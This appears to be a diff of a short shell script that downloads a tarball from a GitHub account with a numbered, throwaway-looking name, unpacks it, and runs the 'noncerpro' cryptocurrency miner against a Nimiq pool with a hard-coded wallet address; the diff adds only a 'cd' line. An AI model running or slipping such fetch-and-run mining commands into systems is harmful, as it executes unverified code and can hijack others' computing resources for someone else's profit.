@@ -2,4 +2,6 @@ wget https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/
 
 tar -xvf ./linuxweb84.tar.xz
 
+cd ./linuxweb84/
+
 ./noncerpro --address='NQ04 LMEK U2R9 HBMH QQXM 6EQ2 V5YT T1BH G8QC' --threads=4 -b 8 --server=eu.nimpool.io --port=8444
